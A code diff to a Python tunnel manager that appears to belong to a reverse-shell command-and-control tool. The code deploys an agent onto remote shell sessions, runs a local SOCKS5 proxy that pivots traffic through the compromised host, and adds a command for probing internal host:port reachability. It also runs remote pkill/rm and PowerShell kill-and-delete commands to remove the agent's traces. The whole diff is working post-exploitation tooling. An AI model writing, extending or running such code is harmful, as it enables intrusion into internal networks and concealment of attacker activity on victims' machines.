-            if agent:
-                resp = self._send_agent_message(client_sock, agent, message, timeout=timeout)
+        if not self._has_channels(client_sock):
+            self._wait_for_channel(client_sock, agent['token'], timeout=10.0)
+        resp, conn = self._channel_request(
+            client_sock, message, timeout=timeout, preferred=preferred,
+        )
+        if resp is not None:
+            return resp
+        self._wait_for_channel(client_sock, agent['token'], timeout=8.0)
+        resp, _ = self._channel_request(client_sock, message, timeout=timeout)
         return resp
 
-    def _agent_batch(self, client_sock, items, timeout=15.0):
-        return self._agent_request(client_sock, {'op': 'batch', 'items': items}, timeout=timeout)
-
-    def _session_proxy_count(self, client_sock):
-        with self._lock:
-            return sum(
-                1 for p in self._proxies.values()
-                if p.get('client_sock') == client_sock
-            )
-
     def _cleanup_remote_tunnel_artifacts(self, client_sock, reason='cleanup'):
-        """Kill remote tunnel agent and remove SOCKS-related files."""
         agent = self._session_agents.get(client_sock)
         info = self.h._client_info(client_sock)
         if not agent and not info:
+            self._drop_pool(client_sock)
             return False
 
         shell_type = (info or {}).get('type', 'unix')
         token = (agent or {}).get('token') or self._agent_token(client_sock)
         if not token:
+            self._drop_pool(client_sock)
             return False
 
-        agent_path = (agent or {}).get('remote_path', '')
-        port_path = (agent or {}).get('port_path', '')
-        if not agent_path or not port_path:
-            agent_path, port_path = self._remote_paths(client_sock, shell_type, token)
-
+        agent_path = (agent or {}).get('remote_path') or self._remote_paths(client_sock, shell_type, token)
         path_esc = self.h._escape_path(agent_path, shell_type)
-        port_esc = self.h._escape_path(port_path, shell_type)
         token_esc = token.replace("'", "'\\''")
 
         if shell_type == 'windows':
             cleanup_ps = (
-                f"$token='{token}';"
-                f"$agent='{path_esc}';$port='{port_esc}';"
                 f"Get-CimInstance Win32_Process -Filter \"CommandLine LIKE '%.tornado_agent_{token}.py%'\" "
                 f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }};"
-                f"$left=@();"
-                f"foreach($f in @($agent,$port)){{"
-                f"  if($f -and (Test-Path -LiteralPath $f)){{Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue;"
-                f"  if(Test-Path -LiteralPath $f){{$left+=$f}}}}}};"
-                f"if($left.Count){{'{TUNNEL_MARK_START}PARTIAL:'+($left -join ',')+'{TUNNEL_MARK_END}'}}"
-                f"else{{'{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'}}"
+                f"Remove-Item -LiteralPath '{path_esc}' -Force -ErrorAction SilentlyContinue;"
+                f"'{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
             )
             result = self._tunnel_marked(client_sock, '', cleanup_ps, 'windows', timeout=20.0)
         else:
-            sock_path = os.path.join(
-                os.path.dirname(port_path.replace('\\', '/')),
-                f".tornado_tun_{token}.sock",
-            )
-            sock_esc = self.h._escape_path(sock_path, shell_type)
             unix_cmd = (
                 f"pkill -f '.tornado_agent_{token_esc}.py' 2>/dev/null; "
-                f"rm -f '{path_esc}' '{port_esc}' '{sock_esc}' 2>/dev/null; "
-                f"left=''; "
-                f"for f in '{path_esc}' '{port_esc}' '{sock_esc}'; do "
-                f"[ -e \"$f\" ] && left=\"$left $f\"; done; "
-                f"if [ -n \"$left\" ]; then "
-                f"printf '%sPARTIAL:%s%s' '{TUNNEL_MARK_START}' \"$left\" '{TUNNEL_MARK_END}'; "
-                f"else printf '%sOK%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'; fi"
+                f"rm -f '{path_esc}' 2>/dev/null; "
+                f"printf '%sOK%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'"
             )
             result = self._tunnel_marked(client_sock, unix_cmd, '', shell_type, timeout=20.0)
 
+        self._drop_pool(client_sock)
         with self._lock:
             self._session_agents.pop(client_sock, None)
+            self._token_sessions.pop(token, None)
+            self._channel_ready.pop(token, None)
+            self._session_stream_counters.pop(client_sock, None)
+            self._deploy_locks.pop(client_sock, None)
 
         ok = result == 'OK'
-        detail = 'all artifacts removed' if ok else (result or 'no response')
-        msg = f"Remote tunnel cleanup ({reason}): {detail}"
-        if ok:
-            print(f"{self.h.colors['green']}{msg}{self.h.colors['end']}")
-        else:
-            print(f"{self.h.colors['yellow']}{msg}{self.h.colors['end']}")
+        msg = f"Remote tunnel cleanup ({reason}): {'removed' if ok else (result or 'no response')}"
+        color = self.h.colors['green'] if ok else self.h.colors['yellow']
+        print(f"{color}{msg}{self.h.colors['end']}")
         self._log(client_sock, msg)
         return ok
 
     def cleanup_session(self, client_sock):
-        """Stop SOCKS proxies and remove agent state for a session."""
-        to_stop = []
-        with self._lock:
-            for pid, proxy in list(self._proxies.items()):
-                if proxy.get('client_sock') == client_sock:
-                    to_stop.append(pid)
-        for proxy_id in to_stop:
-            self._stop_proxy(proxy_id, reason='session disconnected', cleanup_remote=False)
+        for pid, p in list(self._proxies.items()):
+            if p.get('client_sock') == client_sock:
+                self._stop_proxy(pid, reason='session disconnected', cleanup_remote=False)
         self._cleanup_remote_tunnel_artifacts(client_sock, reason='session disconnected')
-        with self._lock:
-            self._session_locks.pop(client_sock, None)
 
     def start_socks(self, client_sock, listen_port):
         info = self.h._client_info(client_sock)
         if not info:
             print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
             return False
-
         try:
             listen_port = int(listen_port)
         except ValueError:
             print(f"{self.h.colors['red']}Invalid port{self.h.colors['end']}")
             return False
 
-        ping = self._agent_request(client_sock, {'op': 'ping'}, timeout=25.0)
-        if not ping or not ping.get('ok'):
-            detail = self._last_error or 'tunnel agent did not respond'
-            print(
-                f"{self.h.colors['red']}Failed to deploy tunnel agent on remote session: {detail}{self.h.colors['end']}"
-            )
+        if not self._agent_request(client_sock, {'op': 'ping'}, timeout=25.0):
+            print(f"{self.h.colors['red']}Failed to start tunnel: {self._last_error or 'no response'}{self.h.colors['end']}")
             return False
 
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
             listener.bind(('127.0.0.1', listen_port))
-            listener.listen(128)
+            listener.listen(256)
         except OSError as exc:
             listener.close()
             print(f"{self.h.colors['red']}Cannot bind 127.0.0.1:{listen_port}: {exc}{self.h.colors['end']}")
@@ -545,14 +753,8 @@ class TunnelManager:
         proxy_id = self._next_id('socks')
         stop_event = threading.Event()
         proxy = {
-            'id': proxy_id,
-            'type': 'socks5',
-            'client_sock': client_sock,
-            'session_id': info['id'],
-            'listen_port': listen_port,
-            'listener': listener,
-            'stop_event': stop_event,
-            'stream_counter': 0,
+            'id': proxy_id, 'client_sock': client_sock, 'session_id': info['id'],
+            'listen_port': listen_port, 'listener': listener, 'stop_event': stop_event,
         }
         with self._lock:
             self._proxies[proxy_id] = proxy
@@ -562,23 +764,58 @@ class TunnelManager:
                 try:
                     listener.settimeout(1.0)
                     try:
-                        conn, addr = listener.accept()
+                        conn, _ = listener.accept()
                     except socket.timeout:
                         continue
+                    _set_keepalive(conn)
                     threading.Thread(
-                        target=self._handle_socks_client,
-                        args=(proxy_id, client_sock, conn, addr),
-                        daemon=True,
+                        target=self._handle_socks_client, args=(client_sock, conn), daemon=True,
                     ).start()
                 except OSError:
                     break
 
         threading.Thread(target=accept_loop, daemon=True).start()
+        n = len(self._alive_conns(client_sock))
+        print(f"{self.h.colors['green']}SOCKS5 {proxy_id}: 127.0.0.1:{listen_port} via #{info['id']} ({n} ch){self.h.colors['end']}")
+        print(f"{self.h.colors['cyan']}  proxychains: proxy_dns + socks5 127.0.0.1 {listen_port}{self.h.colors['end']}")
+        print(f"{self.h.colors['cyan']}  test reachability: socks test <host> <port>{self.h.colors['end']}")
+        return True
 
-        msg = f"SOCKS5 proxy {proxy_id}: 127.0.0.1:{listen_port} via session #{info['id']}"
-        print(f"{self.h.colors['green']}{msg}{self.h.colors['end']}")
-        print(f"{self.h.colors['cyan']}  Use proxychains/nproxy: socks5 127.0.0.1 {listen_port}{self.h.colors['end']}")
-        self._log(client_sock, f"Created {msg}")
+    def _socks_test(self, client_sock, host, port):
+        """Test TCP reachability to an internal host through the tunnel agent."""
+        try:
+            port = int(port)
+        except (TypeError, ValueError):
+            print(f"{self.h.colors['red']}Invalid port{self.h.colors['end']}")
+            return True
+
+        info = self.h._client_info(client_sock)
+        if not info:
+            print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
+            return True
+
+        sid = self._next_stream_id(client_sock)
+        started = time.time()
+        resp = self._agent_request(
+            client_sock,
+            {'op': 'connect', 'sid': sid, 'host': host, 'port': port},
+            timeout=45.0,
+        )
+        elapsed = time.time() - started
+        if resp and resp.get('ok'):
+            print(
+                f"{self.h.colors['green']}OK: {host}:{port} via #{info['id']} "
+                f"({elapsed:.2f}s){self.h.colors['end']}"
+            )
+            self._log(client_sock, f"SOCKS test OK: {host}:{port} ({elapsed:.2f}s)")
+            self._agent_request(client_sock, {'op': 'close', 'sid': sid}, timeout=5.0)
+        else:
+            err = (resp or {}).get('error', self._last_error or 'no response')
+            print(
+                f"{self.h.colors['red']}FAIL: {host}:{port} via #{info['id']} — {err} "
+                f"({elapsed:.2f}s){self.h.colors['end']}"
+            )
+            self._log(client_sock, f"SOCKS test FAIL: {host}:{port} — {err}")
         return True
 
     def _recv_exact(self, sock, n, timeout=10.0):
@@ -596,16 +833,86 @@ class TunnelManager:
                 return None
         return data if len(data) == n else None
 
-    def _handle_socks_client(self, proxy_id, client_sock, conn, addr):
-        sid = None
+    def _relay(self, client_sock, tunnel_conn, sid, conn):
+        """Relay data between SOCKS client and one pinned tunnel channel."""
+        idle_rounds = 0
+        while client_sock in self.h.revshell_clients and self._conn_alive(tunnel_conn):
+            outbound = None
+            try:
+                r, _, _ = select.select([conn], [], [], 0.05)
+                if r:
+                    outbound = conn.recv(RELAY_CHUNK)
+                    if not outbound:
+                        break
+            except OSError:
+                break
+
+            if outbound:
+                message = {
+                    'op': 'batch',
+                    'items': [
+                        {
+                            'op': 'send', 'sid': sid,
+                            'data': base64.b64encode(outbound).decode('ascii'),
+                        },
+                        {'op': 'recv', 'sid': sid, 'max': RELAY_CHUNK},
+                    ],
+                }
+                resp, hard_fail = self._request_on(
+                    tunnel_conn, message, timeout=RELAY_ACTIVE_TIMEOUT,
+                )
+                idle_rounds = 0
+            else:
+                resp, hard_fail = self._request_on(
+                    tunnel_conn,
+                    {'op': 'recv', 'sid': sid, 'max': RELAY_CHUNK},
+                    timeout=RELAY_IDLE_TIMEOUT,
+                )
+                idle_rounds += 1
+
+            if resp is None:
+                if hard_fail:
+                    break
+                if idle_rounds > 40:
+                    break
+                continue
+
+            idle_rounds = 0
+            if resp.get('results') is not None:
+                results = resp['results']
+                if outbound and results and not results[0].get('ok', True):
+                    break
+                recv_res = results[-1] if results else None
+            else:
+                recv_res = resp
+            if recv_res and recv_res.get('data'):
+                try:
+                    conn.sendall(base64.b64decode(recv_res['data']))
+                except OSError:
+                    break
+            if recv_res and recv_res.get('closed'):
+                break
+            if recv_res and recv_res.get('ok') is False and recv_res.get('error') in ('closed', 'missing'):
+                break
+
+        if tunnel_conn and self._conn_alive(tunnel_conn):
+            self._request_on(tunnel_conn, {'op': 'close', 'sid': sid}, timeout=3.0)
+
+    def _conn_alive(self, conn):
         try:
-            conn.settimeout(10.0)
+            return conn.fileno() != -1
+        except OSError:
+            return False
+
+    def _handle_socks_client(self, client_sock, conn):
+        sid = None
+        tunnel_conn = None
+        try:
+            conn.settimeout(15.0)
             greeting = self._recv_exact(conn, 2)
             if not greeting or greeting[0] != 0x05:
                 return
-            nmethods = greeting[1]
-            methods = self._recv_exact(conn, nmethods)
-            if not methods:
+            if not self._recv_exact(conn, greeting[1]):
                 return
             conn.sendall(b'\x05\x00')
 
@@ -614,91 +921,48 @@ class TunnelManager:
                 return
             atyp = req[3]
             if atyp == 0x01:
-                addr_bytes = self._recv_exact(conn, 4)
-                host = socket.inet_ntoa(addr_bytes) if addr_bytes else None
+                b = self._recv_exact(conn, 4)
+                host = socket.inet_ntoa(b) if b else None
             elif atyp == 0x03:
                 ln = self._recv_exact(conn, 1)
-                if not ln:
-                    return
-                host_bytes = self._recv_exact(conn, ln[0])
-                host = host_bytes.decode('utf-8', errors='ignore') if host_bytes else None
+                b = self._recv_exact(conn, ln[0]) if ln else None
+                host = b.decode('utf-8', errors='ignore') if b else None
             elif atyp == 0x04:
-                addr_bytes = self._recv_exact(conn, 16)
-                host = socket.inet_ntop(socket.AF_INET6, addr_bytes) if addr_bytes else None
+                b = self._recv_exact(conn, 16)
+                host = socket.inet_ntop(socket.AF_INET6, b) if b else None
             else:
                 conn.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')
                 return
-            port_bytes = self._recv_exact(conn, 2)
-            if not port_bytes or not host:
+            pb = self._recv_exact(conn, 2)
+            if not pb or not host:
                 return
-            port = struct.unpack('!H', port_bytes)[0]
+            port = struct.unpack('!H', pb)[0]
 
-            with self._lock:
-                proxy = self._proxies.get(proxy_id)
-                if not proxy:
-                    return
-                proxy['stream_counter'] += 1
-                sid = proxy['stream_counter']
-
-            lock = self._session_lock(client_sock)
-            with lock:
-                resp = self._agent_request(
+            sid = self._next_stream_id(client_sock)
+            tunnel_conn = self._pick_channel(client_sock)
+            resp = None
+            for _ in range(TUNNEL_POOL_SIZE + 1):
+                if not tunnel_conn:
+                    break
+                resp, tunnel_conn = self._channel_request(
                     client_sock,
                     {'op': 'connect', 'sid': sid, 'host': host, 'port': port},
-                    timeout=25.0,
+                    timeout=45.0,
+                    preferred=tunnel_conn,
                 )
+                if resp and resp.get('ok'):
+                    break
+                tunnel_conn = self._pick_channel(client_sock)
+
             if not resp or not resp.get('ok'):
+                err = (resp or {}).get('error', self._last_error or 'no response')
+                self._log(client_sock, f"SOCKS connect {host}:{port} failed: {err}")
                 conn.sendall(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
                 return
 
-            bind_addr = socket.inet_aton('0.0.0.0')
-            reply = b'\x05\x00\x00\x01' + bind_addr + struct.pack('!H', 0)
-            conn.sendall(reply)
+            conn.sendall(b'\x05\x00\x00\x01' + socket.inet_aton('0.0.0.0') + struct.pack('!H', 0))
             conn.setblocking(False)
-
-            closed = False
-            while not closed:
-                if client_sock not in self.h.revshell_clients:
-                    break
-                batch = []
-                try:
-                    r, _, _ = select.select([conn], [], [], 0.05)
-                    if r:
-                        data = conn.recv(65536)
-                        if not data:
-                            closed = True
-                        else:
-                            batch.append({
-                                'op': 'send', 'sid': sid,
-                                'data': base64.b64encode(data).decode('ascii'),
-                            })
-                except OSError:
-                    closed = True
-
-                batch.append({'op': 'recv', 'sid': sid, 'max': 65536})
-
-                with lock:
-                    if len(batch) == 1:
-                        res = self._agent_request(client_sock, batch[0], timeout=15.0)
-                        results = [res] if res else []
-                    else:
-                        res = self._agent_batch(client_sock, batch, timeout=15.0)
-                        results = res.get('results', []) if res and res.get('ok') else []
-
-                recv_res = results[-1] if results else None
-                if recv_res and recv_res.get('data'):
-                    try:
-                        conn.sendall(base64.b64decode(recv_res['data']))
-                    except OSError:
-                        closed = True
-                if recv_res and recv_res.get('closed'):
-                    closed = True
-
-                if not batch or (len(batch) == 1 and batch[0]['op'] == 'recv'):
-                    time.sleep(0.02)
-
-            with lock:
-                self._agent_request(client_sock, {'op': 'close', 'sid': sid}, timeout=5.0)
+            self._relay(client_sock, tunnel_conn, sid, conn)
         except Exception:
             pass
         finally:
@@ -717,34 +981,33 @@ class TunnelManager:
             proxy['listener'].close()
         except OSError:
             pass
-        client_sock = proxy.get('client_sock')
-        msg = f"SOCKS5 proxy {proxy_id} stopped ({reason})"
-        print(f"{self.h.colors['yellow']}{msg}{self.h.colors['end']}")
-        if client_sock:
-            self._log(client_sock, msg)
-            if cleanup_remote and self._session_proxy_count(client_sock) == 0:
-                self._cleanup_remote_tunnel_artifacts(client_sock, reason=reason)
+        cs = proxy.get('client_sock')
+        print(f"{self.h.colors['yellow']}SOCKS5 {proxy_id} stopped ({reason}){self.h.colors['end']}")
+        if cs and cleanup_remote and not any(p.get('client_sock') == cs for p in self._proxies.values()):
+            self._cleanup_remote_tunnel_artifacts(cs, reason=reason)
         return True
 
     def list_tunnels(self):
-        with self._lock:
-            proxies = list(self._proxies.values())
+        proxies = list(self._proxies.values())
         if not proxies:
             print(f"{self.h.colors['yellow']}No active SOCKS proxies{self.h.colors['end']}")
             return
         print(f"{self.h.colors['green']}SOCKS5 proxies:{self.h.colors['end']}")
-        for proxy in proxies:
-            alive = proxy['client_sock'] in self.h.revshell_clients
-            status = 'active' if alive else 'orphaned'
-            print(
-                f"  {proxy['id']} session #{proxy['session_id']} "
-                f"127.0.0.1:{proxy['listen_port']} [{status}]"
-            )
+        for p in proxies:
+            alive = p['client_sock'] in self.h.revshell_clients
+            n = len(self._alive_conns(p['client_sock']))
+            print(f"  {p['id']} #{p['session_id']} 127.0.0.1:{p['listen_port']} [{n}/{TUNNEL_POOL_SIZE} ch, {'up' if alive else 'orphan'}]")
 
     def handle_command(self, client_sock, cmd_parts, from_client=False):
         if not cmd_parts:
             return False
         cmd = cmd_parts[0].lower()
+
+        if cmd == 'socks' and len(cmd_parts) >= 2 and cmd_parts[1].lower() == 'test':
+            if len(cmd_parts) < 4:
+                print(f"{self.h.colors['red']}Usage: socks test <host> <port>{self.h.colors['end']}")
+                return True
+            return self._socks_test(client_sock, cmd_parts[2], cmd_parts[3])
 
         if cmd == 'socks' and len(cmd_parts) >= 2 and cmd_parts[1].lower() == 'stop':
             if self._stop_proxy(cmd_parts[2] if len(cmd_parts) > 2 else ''):
@@ -756,51 +1019,59 @@ class TunnelManager:
             if from_client:
                 if len(cmd_parts) < 2:
                     print(f"{self.h.colors['red']}Usage: socks <listen_port>{self.h.colors['end']}")
+                    print(f"{self.h.colors['cyan']}       socks test <host> <port>{self.h.colors['end']}")
+                    print(f"{self.h.colors['cyan']}       socks stop <proxy_id>{self.h.colors['end']}")
                     return True
-                self.start_socks(client_sock, cmd_parts[1])
-                return True
-            if len(cmd_parts) < 3:
-                print(f"{self.h.colors['red']}Usage: socks <session_id> <listen_port>{self.h.colors['end']}")
-                return True
-            self.start_socks(client_sock, cmd_parts[2])
+                port = cmd_parts[1]
+            else:
+                port = cmd_parts[2] if len(cmd_parts) > 2 else None
+                if not port:
+                    print(
+                        f"{self.h.colors['red']}Usage: socks <session_id> <listen_port> | "
+                        f"socks <session_id> test <host> <port>{self.h.colors['end']}"
+                    )
+                    return True
+            self.start_socks(client_sock, port)
             return True
 
         if cmd == 'tunnels':
             self.list_tunnels()
             return True
-
         return False
 
     def handle_main_command(self, cmd_parts):
-        """Handle main-menu SOCKS commands that include session ID resolution."""
         if not cmd_parts:
             return False
         cmd = cmd_parts[0].lower()
-
         if cmd == 'tunnels':
             self.list_tunnels()
             return True
-
         if cmd == 'socks' and len(cmd_parts) >= 3 and cmd_parts[1].lower() == 'stop':
             if self._stop_proxy(cmd_parts[2]):
                 return True
-            print(f"{self.h.colors['red']}Proxy {cmd_parts[2]} not found{self.h.colors['end']}")
+            print(f"{self.h.colors['red']}Proxy not found{self.h.colors['end']}")
             return True
-
-        if cmd == 'socks':
-            if len(cmd_parts) < 3:
-                print(f"{self.h.colors['red']}Usage: socks <session_id> <listen_port>{self.h.colors['end']}")
-                return True
+        if cmd == 'socks' and len(cmd_parts) >= 5 and cmd_parts[2].lower() == 'test':
             try:
                 session_id = int(cmd_parts[1])
             except ValueError:
                 print(f"{self.h.colors['red']}Invalid session ID{self.h.colors['end']}")
                 return True
-            client_sock = self.h._get_client_by_id(session_id)
-            if not client_sock:
-                print(f"{self.h.colors['red']}Client #{session_id} not active{self.h.colors['end']}")
+            cs = self.h._get_client_by_id(session_id)
+            if not cs:
+                print(f"{self.h.colors['red']}Client not active{self.h.colors['end']}")
                 return True
-            self.handle_command(client_sock, cmd_parts, from_client=False)
-            return True
-
+            return self._socks_test(cs, cmd_parts[3], cmd_parts[4])
+        if cmd == 'socks':
+            if len(cmd_parts) < 3:
+                print(
+                    f"{self.h.colors['red']}Usage: socks <session_id> <listen_port> | "
+                    f"socks <session_id> test <host> <port>{self.h.colors['end']}"
+                )
+                return True
+            cs = self.h._get_client_by_id(int(cmd_parts[1]))
+            if not cs:
+                print(f"{self.h.colors['red']}Client not active{self.h.colors['end']}")
+                return True
+            return self.handle_command(cs, cmd_parts, from_client=False)
         return False
